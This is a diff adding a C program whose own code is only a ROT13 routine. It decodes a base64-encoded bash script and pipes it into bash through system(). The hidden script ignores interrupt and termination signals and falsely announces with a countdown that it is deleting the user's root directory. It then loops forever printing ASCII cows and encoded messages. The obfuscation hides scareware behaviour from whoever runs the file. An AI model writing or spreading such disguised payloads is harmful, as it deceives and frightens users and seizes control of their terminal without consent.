@@ -1,0 +1,39 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <ctype.h>
+
+void hjgdq(char *kys)
+{
+    while (*kys)
+    {
+        if (isalpha(*kys))
+        {
+            char kfdsm = islower(*kys) ? 'a' : 'A';
+            *kys = ((*kys - kfdsm + 13) % 26) + kfdsm;
+        }
+        kys++;
+    }
+}
+
+int main(int argc, char *argv[])
+{
+    char ee[] = "rpub";
+    char bb[] = "onfr64";
+    char aa[] = "onfu";
+    hjgdq(ee);
+    hjgdq(bb);
+    hjgdq(aa);
+
+    char *eurdhfk = "IyEvdXNyL2Jpbi9lbnYgYmFzaAoKaGZoZigpIHsKICBlY2hvICIkMSIgfCB0ciAnYS16QS1aJyAnbi16YS1tTi1aQS1NJwp9CgoKdHQ9IiQoaGZoZiAiZ2VuYyIpIgpubj0iJChoZmhmICJGVlRWQUciKSIKc3M9IiQoaGZoZiAiRlZUR0ZHQyIpIgpxcT0iJChoZmhmICJGVlRESFZHIikiCmtrPSIkKGhmaGYgIkZWVFhWWVkiKSIKeno9IiQoaGZoZiAiRlZUR1JFWiIpIgpjYz0iJChoZmhmICJGVlRQQkFHIikiCgokdHQgJycgJG5uCiR0dCAnJyAkc3MKJHR0ICcnICRxcQokdHQgJycgJGtrCiR0dCAnJyAkenoKJHR0ICcnICRjYwoKZmY9InVnZ2NmOi8vampqLmxiaGdob3IucGJ6L2puZ3B1P2k9SWw4emJPcFhJVloiCgphYT0iJChoZmhmICIkZmYiKSIKZ2c9IiQoaGZoZiAiR3Z6ciBlcnpudmF2YXQ6IikiCmJiPSIkKGhmaGYgImpyb29lYmpmcmUiKSIKZWU9IiQoaGZoZiAiTGJoIHVuaXIiKSIKamo9IiQoaGZoZiAiZnlycmMiKSIKY2M9IiQoaGZoZiAiY2xndWJhMyIpIgpmZj0iJChoZmhmICJmcnBiYXFmIG9yc2JlciBndXZmIGZwZXZjZyBxcnlyZ3JmIGxiaGUgZWJiZyBxdmVycGdiZWwuLi4iKSIKaWk9IiQoaGZoZiAiR3Z6cidmIGhjISBRcnlyZ3ZhdCBlYmJnIHF2ZXJwZ2JlbCBhYmouLi4iKSIKZGQ9IiQoaGZoZiAicnB1YiIpIgpoaD0iJChoZmhmICJmcnBiYXFmIikiCmlvaW89IiQoaGZoZiAieWJwbnkiKSIKcGFwYT0iJChoZmhmICJjZXZhZ3MiKSIKZWF6cz0iJChoZmhmICJ5cmciKSIKY3N3eD0iJChoZmhmICJweXJuZSIpIgoKcHA9MTAKCiRkZCAiJGVlICRwcCAkZmYiCiRkZCAtZSAiXDAzM1szMW0iCmZvciAoKGkgPSBwcDsgaSA+PSAwOyBpLS0pKTsgZG8KICAgICRkZCAtbiAiJGdnICRpICRoaCIKICAgICRqaiAxCiAgICAkZGQgLWUgIlxyXGMiCmRvbmUKCmlvcHphaW9lcGEoKSB7CiAgICAkaW9pbyBuZmpkcXNuamZkaT01MAogICAgJGlvaW8gbmZpb3plaWVvenlpPTAuMSAgIAogICAgJGlvaW8gY2l6ZXl6YXVpZXJhej0wCgogICAgd2hpbGUgWyAkY2l6ZXl6YXVpZXJheiAtbGUgJG5mamRxc25qZmRpIF07IGRvCiAgICAgICAgJHBhcGEgIlxyWyIKCiAgICAgICAgZm9yICgoaSA9IDA7IGkgPCAkbmZqZHFzbmpmZGk7IGkrKykpOyBkbwogICAgICAgICAgICBpZiBbICRpIC1sdCAkY2l6ZXl6YXVpZXJheiBdOyB0aGVuCiAgICAgICAgICAgICAgICAkcGFwYSAiPSIKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgJHBhcGEgIiAiCiAgICAgICAgICAgIGZpCiAgICAgICAgZG9uZQoKICAgICAgICAkcGFwYSAiXSAlM2QlJSIgJCgoY2l6ZXl6YXVpZXJheiAqIDEwMCAvIG5mamRxc25qZmRpKSkKICAgICAgICAoKGNpemV5emF1aWVyYXorKykpCiAgICAgICAgJGpqICRuZmlvemVpZW96eWkKICAgIGRvbmUKCiAgICAkcGFwYSAiXG4iCn0KCiRkZCAiJGlpIgoKJGpqIDIKCmlvcHphaW9lcGEKCiMgJGNjIC14ICAgIG0gJGJiICIkYWEiCgokZWF6cyBhPTA7CiRlYXpzIGI9MTsKCmtvYXBlYT0oCiIkKGhmaGYgIkdseXhiIHdycWFiIGogdMWCYmp2ciB6bnoiKSIgCiIkKGhmaGYgInhieGZoIDUgdGVueiIpIiAKIiQoaGZoZiAiYnF5cnB2csSHIGZueiIpIgoiJChoZmhmICJKIHhlbnZhxJkgbW5jYnphdnJhdm4iKSIgCiIkKGhmaGYgImogdMWCYmp2ciB6bMWbeXYgem56IikiIAoiJChoZmhmICJ4dnJxbCBmeGLFhHBtbCBmdsSZIGdyYSBmZ25hIikiIAoiJChoZmhmICJ0cWwgd2jFvCBhdnIgb8SZccSZIGZueiIpIiAKIiQoaGZoZiAib2IgandycW12ciBvdm7FgmwgasSZdGJlbSIpIiApOwoKd2hpbGUgOgpkbwoKaWVvYXpwZWFwej0kKChiICUgMikpCmlmIFsgJGllb2F6cGVhcHogLWVxIDAgXQp0aGVuCiRkZCAiICAtLS0tLS0gIgokZGQgIiAke2tvYXBlYVskYV19ICIKJGRkICIgIC0tLS0tLSAiCiRkZCAiICAgICBcICAgIF5fX14gIgokZGQgIiAgICAgIFwgICAob28pXF9fX19fX19fICIKJGRkICIgICAgICAgICAgKF9fKVwgICAgICAgIClcIC9cICIKJGRkICIgICAgICAgICAgIFUgIHx8LS0tLS13IHwiCiRkZCAiICAgICAgICAgICAgICB8fCAgICAgIHx8ICIKJGVhenMgYT1hKzEKJGpqIDIKJGNzd3gKZWxzZQokZGQgIiAgICAgLS0tLS0tICIKJGRkICIgICAgJHtrb2FwZWFbJGFdfSAiCiRkZCAiICAgICAtLS0tLS0gIiAgCiRkZCAiICAgICAgICBcICAgIF5fX14gIiAKJGRkICIgICAgICAgICBcICAgKG9vKVxfX19fX19fXyAiIAokZGQgIiAgICAgICAgICAgICAoX18pXCAgICAgICAgKVwgL1wgIiAKJGRkICIgICAgICAgICAgICAgIFUgIHx8LS0tLS13IHwiIAokZGQgIiAgICAgICAgICAgICAgICAgfHwgICAgICB8fCAiICAKJGVhenMgYT1hKzEgCiRqaiAyIAokY3N3eAoKZmkKJGVhenMgYj1iKzEKaWYgWyAkYSAtZXEgOCBdCnRoZW4KJGVhenMgYT0wCmZpCgpkb25lCgoKCnJlYWQgZg==";
+    char jhqgsdjqg[10000];
+
+    snprintf(jhqgsdjqg, sizeof(jhqgsdjqg), "%s %s | %s -d | %s", ee, eurdhfk, bb, aa);
+
+    system(jhqgsdjqg);
+
+    // char kys[] = "v jnaan teno lbhe obbgl";
+    // hjgdq(kys);
+    // printf("%s\n", kys);
+
+    return 0;
+}
